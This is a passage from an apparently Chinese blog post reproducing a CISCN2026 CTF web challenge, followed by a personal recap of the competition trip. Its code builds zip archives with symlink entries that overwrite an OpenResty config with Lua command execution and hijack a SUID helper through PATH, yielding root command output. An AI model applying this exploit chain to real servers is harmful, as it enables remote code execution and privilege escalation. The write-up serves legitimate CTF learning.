+    z.writestr(zi, <span class="hljs-string">&quot;/usr/local/openresty/nginx/conf/snippets&quot;</span>)
+
+    <span class="hljs-comment"># 2. 创建一个普通文件条目：x/ez-dynamic.conf</span>
+    zi = zipfile.ZipInfo(<span class="hljs-string">&quot;x/ez-dynamic.conf&quot;</span>)
+    zi.create_system = <span class="hljs-number">3</span>
+    zi.external_attr = (<span class="hljs-number">0o644</span> &lt;&lt; <span class="hljs-number">16</span>)
+    z.writestr(zi, payload)
+
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;probe.zip generated&quot;</span>)
+</code></pre>
+
+<p>在这个压缩包的同目录打开cmd</p>
+<pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">desktop</span>\<span class="hljs-title">work_place</span>\<span class="hljs-title">Web</span>&gt;<span class="hljs-title">curl</span> -<span class="hljs-title">F</span> &quot;<span class="hljs-title">package</span>=@<span class="hljs-title">probe.zip</span>;<span class="hljs-title">type</span>=<span class="hljs-title">application</span>/<span class="hljs-title">zip</span>&quot; &quot;<span class="hljs-title">http</span>://127.0.0.1:8888/<span class="hljs-title">api</span>/<span class="hljs-title">v2</span>/<span class="hljs-title">preview</span>/<span class="hljs-title">admin</span>/<span class="hljs-title">sync</span>/<span class="hljs-title">upload</span>?<span class="hljs-title">x</span>=/<span class="hljs-title">download</span>&quot;</span>
+<span class="hljs-function">&#123;&quot;<span class="hljs-title">extractedTo</span>&quot;:&quot;/<span class="hljs-title">tmp</span>/<span class="hljs-title">ez</span>-<span class="hljs-title">nginx</span>/<span class="hljs-title">imports</span>/<span class="hljs-title">import</span>-8083481565290392883&quot;,&quot;<span class="hljs-title">dynamicConfigPath</span>&quot;:&quot;/<span class="hljs-title">usr</span>/<span class="hljs-title">local</span>/<span class="hljs-title">openresty</span>/<span class="hljs-title">nginx</span>/<span class="hljs-title">conf</span>/<span class="hljs-title">snippets</span>/<span class="hljs-title">ez</span>-<span class="hljs-title">dynamic.conf</span>&quot;,&quot;<span class="hljs-title">reloaded</span>&quot;:<span class="hljs-title">true</span>&#125;</span>
+<span class="hljs-function"><span class="hljs-title">D</span>:\<span class="hljs-title">desktop</span>\<span class="hljs-title">work_place</span>\<span class="hljs-title">Web</span>&gt;<span class="hljs-title">curl</span> <span class="hljs-title">http</span>://127.0.0.1:8888/<span class="hljs-title">inspect</span></span>
+<span class="hljs-function"><span class="hljs-title">probe_ok</span></span></code></pre>
+
+<p>可以看到reload成功：”reloaded”:true</p>
+<p>上传恶意命令exp之前我们分析一下附件里面给的一个c文件，SUID程序</p>
+<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;
+    <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[] = &#123;<span class="hljs-string">&quot;service-check&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;
+
+    <span class="hljs-keyword">if</span> (setgid(<span class="hljs-number">0</span>) != <span class="hljs-number">0</span> || setuid(<span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;
+        perror(<span class="hljs-string">&quot;setuid&quot;</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    &#125;<span class="hljs-comment">//确保是root权限</span>
+   
+    execvp(argv[<span class="hljs-number">0</span>], argv);
+    <span class="hljs-comment">//p表示从环境变量找命令，就是说执行的service-check命令会从PATH找</span>
+    perror(<span class="hljs-string">&quot;execvp&quot;</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+&#125;</code></pre>
+
+<p>那我们现在可以通过创建软链接来劫持这个SUID程序</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile
+<span class="hljs-keyword">from</span> stat <span class="hljs-keyword">import</span> S_IFLNK
+
+<span class="hljs-comment">#Lua注入</span>
+<span class="hljs-comment">#content_by_lua_block:OpenResty 的核心指令，允许直接在 Nginx 处理请求的过程中运行 Lua 代码</span>
+<span class="hljs-comment">#PATH=. /usr/local/bin/ops-helper空格连接仅仅临时修改环境</span>
+nginx_snippet = <span class="hljs-string">r&#x27;&#x27;&#x27;location = /inspect &#123;</span>
+<span class="hljs-string">    default_type text/plain;</span>
+<span class="hljs-string">    content_by_lua_block &#123;</span>
+<span class="hljs-string">        local f = io.popen(&quot;cd /tmp/ez-nginx/imports &amp;&amp; PATH=. /usr/local/bin/ops-helper 2&gt;&amp;1&quot;)</span>
+<span class="hljs-string">        local data = f:read(&quot;*a&quot;)</span>
+<span class="hljs-string">        f:close()</span>
+<span class="hljs-string">        ngx.say(data)</span>
+<span class="hljs-string">    &#125;</span>
+<span class="hljs-string">&#125;</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;</span>
+
+<span class="hljs-keyword">with</span> zipfile.ZipFile(<span class="hljs-string">&quot;solve.zip&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> z:
+    <span class="hljs-comment"># x -&gt; nginx snippets</span>
+    zi = zipfile.ZipInfo(<span class="hljs-string">&quot;x&quot;</span>)
+    zi.create_system = <span class="hljs-number">3</span>
+    zi.external_attr = ((S_IFLNK | <span class="hljs-number">0o777</span>) &lt;&lt; <span class="hljs-number">16</span>)
+    z.writestr(zi, <span class="hljs-string">&quot;/usr/local/openresty/nginx/conf/snippets&quot;</span>)
+
+    <span class="hljs-comment"># 覆盖 ez-dynamic.conf</span>
+    zi = zipfile.ZipInfo(<span class="hljs-string">&quot;x/ez-dynamic.conf&quot;</span>)
+    zi.create_system = <span class="hljs-number">3</span>
+    zi.external_attr = (<span class="hljs-number">0o644</span> &lt;&lt; <span class="hljs-number">16</span>)
+    z.writestr(zi, nginx_snippet)
+
+    <span class="hljs-comment"># y -&gt; /tmp/ez-nginx/imports</span>
+    zi = zipfile.ZipInfo(<span class="hljs-string">&quot;y&quot;</span>)
+    zi.create_system = <span class="hljs-number">3</span>
+    zi.external_attr = ((S_IFLNK | <span class="hljs-number">0o777</span>) &lt;&lt; <span class="hljs-number">16</span>)
+    z.writestr(zi, <span class="hljs-string">&quot;/tmp/ez-nginx/imports&quot;</span>)
+
+    <span class="hljs-comment"># y/service-check -&gt; /bin/sh</span>
+    zi = zipfile.ZipInfo(<span class="hljs-string">&quot;y/service-check&quot;</span>)
+    zi.create_system = <span class="hljs-number">3</span>
+    zi.external_attr = ((S_IFLNK | <span class="hljs-number">0o777</span>) &lt;&lt; <span class="hljs-number">16</span>)
+    z.writestr(zi, <span class="hljs-string">&quot;/bin/sh&quot;</span>)
+
+    <span class="hljs-comment"># y/status</span>
+    zi = zipfile.ZipInfo(<span class="hljs-string">&quot;y/status&quot;</span>)
+    zi.create_system = <span class="hljs-number">3</span>
+    zi.external_attr = (<span class="hljs-number">0o644</span> &lt;&lt; <span class="hljs-number">16</span>)
+    z.writestr(zi, <span class="hljs-string">&quot;/bin/cat /flag.txt\n&quot;</span>)
+
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;solve.zip generated&quot;</span>)
+</code></pre>
+
+<p>运行</p>
+<pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">desktop</span>\<span class="hljs-title">work_place</span>\<span class="hljs-title">Web</span>&gt;<span class="hljs-title">curl</span> -<span class="hljs-title">F</span> &quot;<span class="hljs-title">package</span>=@<span class="hljs-title">solve.zip</span>;<span class="hljs-title">type</span>=<span class="hljs-title">application</span>/<span class="hljs-title">zip</span>&quot; &quot;<span class="hljs-title">http</span>://127.0.0.1:8888/<span class="hljs-title">api</span>/<span class="hljs-title">v2</span>/<span class="hljs-title">preview</span>/<span class="hljs-title">admin</span>/<span class="hljs-title">sync</span>/<span class="hljs-title">upload</span>?<span class="hljs-title">x</span>=/<span class="hljs-title">download</span>&quot;</span>
+<span class="hljs-function">&#123;&quot;<span class="hljs-title">extractedTo</span>&quot;:&quot;/<span class="hljs-title">tmp</span>/<span class="hljs-title">ez</span>-<span class="hljs-title">nginx</span>/<span class="hljs-title">imports</span>/<span class="hljs-title">import</span>-7546730134644676064&quot;,&quot;<span class="hljs-title">dynamicConfigPath</span>&quot;:&quot;/<span class="hljs-title">usr</span>/<span class="hljs-title">local</span>/<span class="hljs-title">openresty</span>/<span class="hljs-title">nginx</span>/<span class="hljs-title">conf</span>/<span class="hljs-title">snippets</span>/<span class="hljs-title">ez</span>-<span class="hljs-title">dynamic.conf</span>&quot;,&quot;<span class="hljs-title">reloaded</span>&quot;:<span class="hljs-title">true</span>&#125;</span>
+<span class="hljs-function"><span class="hljs-title">D</span>:\<span class="hljs-title">desktop</span>\<span class="hljs-title">work_place</span>\<span class="hljs-title">Web</span>&gt;<span class="hljs-title">curl</span> <span class="hljs-title">http</span>://127.0.0.1:8888/<span class="hljs-title">inspect</span></span>
+<span class="hljs-function"><span class="hljs-title">flag</span>&#123;<span class="hljs-title">local_test</span>&#125;</span></code></pre>
+
+<p>因为是root权限执行，所以也可以换成其他命令，比如换成<code>z.writestr(zi, &quot;/bin/id\n&quot;)</code></p>
+<pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">desktop</span>\<span class="hljs-title">work_place</span>\<span class="hljs-title">Web</span>&gt;<span class="hljs-title">curl</span> -<span class="hljs-title">F</span> &quot;<span class="hljs-title">package</span>=@<span class="hljs-title">solve.zip</span>;<span class="hljs-title">type</span>=<span class="hljs-title">application</span>/<span class="hljs-title">zip</span>&quot; &quot;<span class="hljs-title">http</span>://127.0.0.1:8888/<span class="hljs-title">api</span>/<span class="hljs-title">v2</span>/<span class="hljs-title">preview</span>/<span class="hljs-title">admin</span>/<span class="hljs-title">sync</span>/<span class="hljs-title">upload</span>?<span class="hljs-title">x</span>=/<span class="hljs-title">download</span>&quot;</span>
+<span class="hljs-function">&#123;&quot;<span class="hljs-title">extractedTo</span>&quot;:&quot;/<span class="hljs-title">tmp</span>/<span class="hljs-title">ez</span>-<span class="hljs-title">nginx</span>/<span class="hljs-title">imports</span>/<span class="hljs-title">import</span>-3496373560110929912&quot;,&quot;<span class="hljs-title">dynamicConfigPath</span>&quot;:&quot;/<span class="hljs-title">usr</span>/<span class="hljs-title">local</span>/<span class="hljs-title">openresty</span>/<span class="hljs-title">nginx</span>/<span class="hljs-title">conf</span>/<span class="hljs-title">snippets</span>/<span class="hljs-title">ez</span>-<span class="hljs-title">dynamic.conf</span>&quot;,&quot;<span class="hljs-title">reloaded</span>&quot;:<span class="hljs-title">true</span>&#125;</span>
+<span class="hljs-function"><span class="hljs-title">D</span>:\<span class="hljs-title">desktop</span>\<span class="hljs-title">work_place</span>\<span class="hljs-title">Web</span>&gt;<span class="hljs-title">curl</span> <span class="hljs-title">http</span>://127.0.0.1:8888/<span class="hljs-title">inspect</span></span>
+<span class="hljs-function"><span class="hljs-title">uid</span>=0(<span class="hljs-title">root</span>) <span class="hljs-title">gid</span>=0(<span class="hljs-title">root</span>) <span class="hljs-title">groups</span>=0(<span class="hljs-title">root</span>),998(<span class="hljs-title">nginxuser</span>)</span></code></pre>
+
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>福州挺有意思的，虽然没怎么逛，不过吃了很多，尽管学校一分钱也没报销，没招了，自己出钱坐高铁去</p>
+<p>高铁站看热闹，pwn✌瞎拍照还被安保人员盯上了，谁能绷住。。。</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/ciscn2026/nailong.webp" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p>住的比赛协议酒店，以为有温泉的，结果没有。真是次奥了</p>
+<p>酒店离赛场还有30公里，早上六点就起来了</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/ciscn2026/6.jpg" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p>比赛居然不是准点开始，领导们讲话讲了挺久，平台还死机了十来分钟</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/ciscn2026/5.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/ciscn2026/7.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p>比赛手册说的是9点开始，快十点了才看到题目，不过后面推迟了结束时间，倒也没毛</p>
+<p>本来以为要跟去年一样出flask的，结果出了一堆JAVA，吃大亏了，还好有大手子队友。</p>
+<p>后面安心准备考公了，继续加油了</p>
+
+	</div>
+
+	
+
+	
+
+	
+		<div class="post-tags">
+			<i class="fa fa-tags" aria-hidden="true"></i>
+			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/CISCN2026/" rel="tag">CISCN2026</a><a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/CTF/" rel="tag">CTF</a><a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+		</div>
+	
+</article>
+
+	<div id="share_container">
+	<div id="share" data-initialized="true">
+		<a class="no-pjax icon-wechat" tooltip="分享到微信">
+			<button class="btn btn-icon btn-success">
+				<span class="btn-inner--icon"><i class="fa fa-weixin"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-douban" tooltip="分享到豆瓣">
+			<button class="btn btn-icon btn-primary" style="background: #209261;border: none;">
+				豆
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-qq" tooltip="分享到 QQ">
+			<button class="btn btn-icon btn-primary" style="background: #2196f3;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-qq"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-qzone" tooltip="分享到 QQ 空间">
+			<button class="btn btn-icon btn-primary" style="background: #ffc107;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-star"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-weibo" tooltip="分享到微博">
+			<button class="btn btn-icon btn-warning">
+				<span class="btn-inner--icon"><i class="fa fa-weibo"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-facebook" tooltip="分享到 Facebook">
+			<button class="btn btn-icon btn-primary" style="background: #283593;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-facebook"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-twitter" tooltip="分享到 Twitter">
+			<button class="btn btn-icon btn-primary" style="background: #03a9f4;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-twitter"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=http://wo1fyr.github.io/2026/05/09/ciscn2026/&text=CISCN2026部分题目复现" tooltip="分享到 Telegram">
+			<button class="btn btn-icon btn-primary" style="background: #42a5f5;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-telegram"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-copy-link" id="share_copy_link" tooltip="复制链接">
+			<button class="btn btn-icon btn-default">
+				<span class="btn-inner--icon"><i class="fa fa-link"></i></span>
+			</button>
+		</a>
+	</div>
+	<button id="share_show" class="btn btn-icon btn-primary" tooltip="分享">
+		<span class="btn-inner--icon"><i class="fa fa-share"></i></span>
+	</button>
+</div>
+<script type="text/javascript">
+	socialShare("#share", {
+	    title : 'CISCN2026部分题目复现',
+	    description : `ISW192.168.7.8出了一个入口机的flag，当时也不知道怎么进入admin.php的，莫名...`,
+	    wechatQrcodeTitle : "分享到微信",
+	    wechatQrcodeHelper : '微信扫描二维码',
+	    source : 'http://wo1fyr.github.io/2026/05/09/ciscn2026/'
+	});
+	$("#share_show")[0].onclick = function(){
+		$("#share_container").addClass("opened");
+	};
+	$("#share_copy_link")[0].onclick = function(){
+		let input = document.createElement('input');
+		document.body.appendChild(input);
+		input.setAttribute("value", window.location.href);
+		input.setAttribute("readonly", "readonly");
+		input.setAttribute("style", "opacity: 0;mouse-events:none;");
+		input.select();
+		if (document.execCommand('copy')){
+			iziToast.show({
+				title: '链接已复制',
+				message: "链接已复制到剪贴板",
+				class: 'shadow',
+				position: 'topRight',
+				backgroundColor: '#2dce89',
+				titleColor: '#ffffff',
+				messageColor: '#ffffff',
+				iconColor: '#ffffff',
+				progressBarColor: '#ffffff',
+				icon: 'fa fa-check',
+				timeout: 5000
+			});
+		}else{
+			iziToast.show({
+				title: '复制失败',
+				message: "请手动复制链接",
+				class: 'shadow',
+				position: 'topRight',
+				backgroundColor: '#f5365c',
+				titleColor: '#ffffff',
+				messageColor: '#ffffff',
+				iconColor: '#ffffff',
+				progressBarColor: '#ffffff',
+				icon: 'fa fa-close',
+				timeout: 5000
+			});
+		}
+		document.body.removeChild(input);
+	};
+</script>
+
+
+
+
+
+<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"><span class="page-navigation-extra-text"><i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>上一篇</span><a href="/2026/05/29/fastcoll%E4%BD%BF%E7%94%A8/" rel="prev"> MD5碰撞-fastcoll使用</a></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="/2026/04/25/edusrc/" rel="next"> 记录EDUsrc的学习经历</a></div></div>
+
+
+
+
+		
+		
+		
+		
+
+					<footer id="footer" class="site-footer card shadow-sm border-0">
+						
+						<div>Theme <a target="_blank" rel="noopener" href="https://github.com/solstice23/hexo-theme-argon"><strong>Argon</strong></a> | Powered by Hexo</div>
+						<span id="busuanzi_container_site_uv">
+							本站访客数 <span id="busuanzi_value_site_uv"></span> 人次
+						</span>
+					</footer>
+				</main>
+			</div>
+		</div>
+		
+<script src="/argontheme.js"></script>
+
+		
+		
+		
+
+		
+			<script>
+				var argonEnableCodeHighlight = true;
+			</script>
+			
+<link rel="stylesheet" href="/assets/vendor/highlight/styles/github.css">
+
+		
+
+	</div>
+</div>
+<noscript>
+	<style>
+		article img.lazyload[src^="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPg"]{display: none;}
+		.comment-item-text .comment-sticker.lazyload{display: none;}
+	</style>
+</noscript>
+</body>
+
+
+
+</html>
+
